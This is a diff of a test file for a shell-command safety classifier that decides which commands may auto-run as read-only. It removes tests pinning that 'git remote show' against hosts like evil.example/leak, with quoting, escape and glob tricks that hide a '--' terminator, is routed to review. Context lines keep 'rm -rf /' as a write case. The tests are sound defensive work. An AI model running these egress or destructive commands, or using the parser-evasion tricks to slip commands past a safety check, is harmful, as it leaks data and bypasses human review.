@@ -19,7 +19,6 @@ import {
   _setParserFailedForTesting,
 } from './shellAstParser.js';
 import { isShellCommandReadOnly } from './shellReadOnlyChecker.js';
-import { normalizeMonitorCommand } from './shell-utils.js';
 
 // One expect per command, in order.
 async function expectRules(command: string, rules: string[]) {
@@ -413,126 +412,6 @@ describe('classifyShellCommandSafety', () => {
     "printf '%s' value",
   ])('classifies %j as read-only', async (command) => {
     expect(await classifyShellCommandSafety(command)).toBe('read-only');
-  });
-
-  describe('git remote show network egress (#14359)', () => {
-    // `git remote show` queries the remote (git-upload-pack) unless `-n` is
-    // given, so without that flag it must not auto-run as read-only.
-    it.each([
-      'git remote show origin',
-      'git remote show',
-      'git remote show https://evil.example/leak',
-      'git remote show http://127.0.0.1:8973/leak',
-      'git remote show ssh://evil.example/repo',
-      'git remote show git@evil.example:owner/repo',
-      // A `-n` after the `--` terminator is a positional remote name, not the
-      // no-query flag, so the remote is still queried. The `-n` scan must stay
-      // on the pre-terminator slice; these pin that it does.
-      'git remote show origin -- -n',
-      'git remote show -- -n https://evil.example/leak',
-      // git honours `--end-of-options` exactly like `--` (bot round 6 R6-1).
-      'git remote show https://evil.example/leak --end-of-options -n',
-      'git remote show --end-of-options https://evil.example/leak -n',
-      // bash removes quotes and backslashes before git runs, so each of these
-      // reaches git as a bare `--` although the argument text still holds them.
-      'git remote show https://evil.example/leak \\-- -n',
-      'git remote show https://evil.example/leak \\-\\- -n',
-      'git remote show origin ""-- -n',
-      'git remote show origin --"" -n',
-      "git remote show origin ''-- -n",
-      "git remote show origin '-'- -n",
-      "git remote show origin $'--' -n",
-      // tree-sitter ends a word at \r, \v and \f, but bash splits only at
-      // space, tab and newline, so git receives `repo<char>-n` as one
-      // argument and still queries the remote (bot round 8 R8-1).
-      'git remote show ssh://evil.example/repo\r-n',
-      'git remote show ssh://evil.example/repo\v-n',
-      'git remote show ssh://evil.example/repo\f-n',
-      // The word after an input redirection is its source, not an argument.
-      'git remote show https://evil.example/leak <<<-n',
-      'git remote show origin < -n',
-      // tree-sitter drops the backslash of an escaped blank, so its words
-      // hold a bare `-n`, while bash passes ` -n` as a positional (bot round
-      // 9 R9-1). The gate reads the command's raw text, where the backslash
-      // is still there.
-      'git remote show https://evil.example/leak \\ -n',
-      'git remote show origin \\ -n',
-      'git remote show origin \\\t-n',
-      "git remote show origin ''\\ -n",
-      // A heredoc's delimiter and a here-string's substitution are no
-      // arguments (R8-1).
-      'git remote show https://evil.example/leak <<- -n',
-      'git remote show https://evil.example/leak <<<$(printf %s -n)',
-      // Any quote leaves `-n` unproven, even where bash would pass it.
-      'git remote show -n "origin"',
-    ])('routes %j to review instead of auto-running it', async (command) => {
-      expect(await classifyShellCommandSafety(command)).toBe('unknown');
-      expect(await isShellCommandReadOnlyAST(command)).toBe(false);
-    });
-
-    it.each([
-      'git remote show -n origin',
-      'git remote show -n https://evil.example/leak',
-      // `-n` is honoured at any position before `--`, so a trailing `-n`
-      // suppresses the query just as a leading one does; pin that a later
-      // leading-options-only scan cannot silently narrow it.
-      'git remote show origin -n',
-      'git remote show https://evil.example/leak -n',
-      // A `-n` before `--end-of-options` is still an option.
-      'git remote show -n --end-of-options origin',
-      'git remote show -n git@evil.example:owner/repo',
-      // Each command in a pipeline is read from its own text.
-      'git remote show -n origin | head',
-      'git remote get-url origin',
-    ])('keeps %j read-only', async (command) => {
-      expect(await classifyShellCommandSafety(command)).toBe('read-only');
-    });
-
-    // Monitor and plan mode classify the text `normalizeMonitorCommand`
-    // rebuilds from a shell wrapper. The words after the script are its $0,
-    // $1, ...: git never gets them (R10-1).
-    it.each([
-      `bash -c 'git remote show origin' -n`,
-      `sh -c 'git remote show https://evil.example/leak' -n`,
-      `bash -c 'git remote show origin' 2>/dev/null -n`,
-    ])('asks about the wrapped %j', async (command) => {
-      const { safetyCommand } = normalizeMonitorCommand(command);
-      expect(await classifyShellCommandSafety(safetyCommand)).not.toBe(
-        'read-only',
-      );
-      expect(await isShellCommandReadOnlyAST(safetyCommand)).toBe(false);
-      expect(isShellCommandReadOnly(safetyCommand)).toBe(false);
-    });
-
-    it.each([
-      [`bash -c 'git remote show -n origin'`, 'read-only'],
-      [`bash -c 'git remote show -n origin' | head`, 'read-only'],
-      // The argv's operators still classify as written: plan mode blocks
-      // these writes rather than asking about them.
-      [`bash -c 'ls' ; rm target`, 'write'],
-      [`bash -c 'ls' && rm target`, 'write'],
-      [`bash -c 'ls' $0 ; rm target`, 'write'],
-    ])('classifies the wrapped %j as %s', async (command, expected) => {
-      const { safetyCommand } = normalizeMonitorCommand(command);
-      expect(await classifyShellCommandSafety(safetyCommand)).toBe(expected);
-    });
-
-    it('still classifies a write holding a carriage return as a write', async () => {
-      // The \r guard only withholds a read-only verdict, so plan mode keeps
-      // blocking this write instead of asking about it.
-      expect(await classifyShellCommandSafety('rm target\r')).toBe('write');
-    });
-
-    it.each(['cat notes\r', 'ls -la\v', 'head file\f'])(
-      'asks about any read-only command holding a word break bash does not have: %j',
-      async (command) => {
-        // The guard covers every command, not only git: tree-sitter's words
-        // are then not the ones bash runs, so a read-only verdict is not
-        // given, on either checker.
-        expect(await classifyShellCommandSafety(command)).toBe('unknown');
-        expect(isShellCommandReadOnly(command)).toBe(false);
-      },
-    );
   });
 
   it.each([
@@ -1129,29 +1008,6 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
     ['git branch -d feature', false],
     ['git remote -v', true],
     ['git remote add origin url', false],
-    [
-      'git remote show origin --end-of-options -n',
-      false,
-      'end-of-options terminator',
-    ],
-    ['git remote show origin \\-- -n', false, 'escaped terminator'],
-    ["git remote show origin ''-- -n", false, 'quoted terminator'],
-    ["git remote show origin $'--' -n", false, 'ANSI-C quoted terminator'],
-    ['git remote show origin ""-- -n', false, 'empty-quote prefix'],
-    ['git remote show origin --"" -n', false, 'empty-quote suffix'],
-    ["git remote show origin '-'- -n", false, 'split quoted terminator'],
-    ['git remote show origin \\-\\- -n', false, 'per-char escaped terminator'],
-    ['git remote show origin [--][--] -n', false, 'bracket-glob terminator'],
-    ['git remote show origin [-]- -n', false, 'bracket-glob terminator'],
-    ['git remote show origin []-]- -n', false, 'bracket-glob terminator'],
-    [
-      'git remote show origin [[:punct:]]- -n',
-      false,
-      'bracket-glob terminator',
-    ],
-    ['git remote show origin * -n', false, 'star-glob terminator'],
-    ['git remote show origin ?? -n', false, 'question-glob terminator'],
-    ['git remote show origin {--,x} -n', false, 'brace-expanded terminator'],
     ['git --version', true],
 
     // --- find ---
@@ -1257,32 +1113,6 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
       // Regex: shell-quote parses 'foo()' as root → not in readonly → false
       // AST:   function_definition → false
       await expectBoth('foo() { rm -rf /; }', false);
-    });
-  });
-
-  // Both checkers prove `git remote show`'s `-n` with one function over the
-  // command's raw text, so a quote, backslash or bracket anywhere in it
-  // leaves `-n` unproven on each, whatever bash would make of it (#14359).
-  it.each([
-    "git remote show -n ''--",
-    'git remote show -n \\--',
-    'git remote show -n --""',
-    "git remote show -n '-'-",
-    "git remote show -n '-'-'-'",
-    "git remote show -n 'ssh://[::1]/repo'",
-  ])('both checkers ask about %j', async (command) => {
-    expect(isShellCommandReadOnly(command)).toBe(false);
-    expect(await isShellCommandReadOnlyAST(command)).toBe(false);
-  });
-
-  describe('known divergences (git remote show redirection)', () => {
-    // A redirection after the command sits outside its node, so the AST
-    // proves `-n` from the command's own text. The regex fallback has only
-    // the whole segment and asks; its answer is the stricter one.
-    it('[divergence] git remote show -n origin < file: regex unknown, AST read-only', async () => {
-      const command = 'git remote show -n origin < file';
-      expect(isShellCommandReadOnly(command)).toBe(false);
-      expect(await isShellCommandReadOnlyAST(command)).toBe(true);
     });
   });
 });
